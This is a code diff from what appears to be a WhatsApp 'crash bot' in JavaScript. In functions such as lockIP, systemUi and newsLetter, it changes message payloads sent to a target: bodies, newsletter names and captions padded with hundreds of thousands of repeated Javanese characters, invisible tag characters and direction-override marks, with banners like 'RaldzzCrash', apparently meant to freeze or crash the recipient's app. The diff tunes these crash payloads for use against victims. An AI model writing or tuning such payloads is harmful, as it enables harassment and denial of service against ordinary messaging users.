@@ -1261,7 +1261,7 @@ bot.command("status", ctx => {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: "" + "ꦾ".repeat(50000) + "ꦾ".repeat(90000) + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(2100) + "⿻".repeat(50000)
+                                text: "ꦾ".repeat(310000)
                             },
                             nativeFlowMessage: {},
                             contextInfo: {
@@ -1701,7 +1701,7 @@ async function lockIP(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(10000)
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "ꦾ".repeat(340000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -2044,7 +2044,7 @@ async function systemUi(target, Ptcp = false) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "Please.." + "ꦾ".repeat(450000)
+                        text: "Please.." + "ꦾ".repeat(400000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -2157,9 +2157,9 @@ async function newsLetter(target, Ptcp = true) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(33333),
-                                jpegThumbnail: "",
-                                caption: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(33333),
+                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ꦾ".repeat(200000),
+                                jpegThumbnail: fs.readFileSync("./CeLa.jpg"),
+                                caption: "ꦾ".repeat(100000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
@@ -2306,7 +2306,7 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: "Wanna With Yours :)" + "ꦾ".repeat(250000),
+            text: "Wanna With Yours :)" + "ꦾ".repeat(200000),
             contextInfo: {
               stanzaId: "1234567890ABCDEF",
               participant: "0@s.whatsapp.net",
@@ -2415,7 +2415,7 @@ async function newsLetter(target, Ptcp = true) {
         target,
         {
           extendedTextMessage: {
-            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(100000),
+            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(50000),
             contextInfo: {
               fromMe: false,
               stanzaId: target,
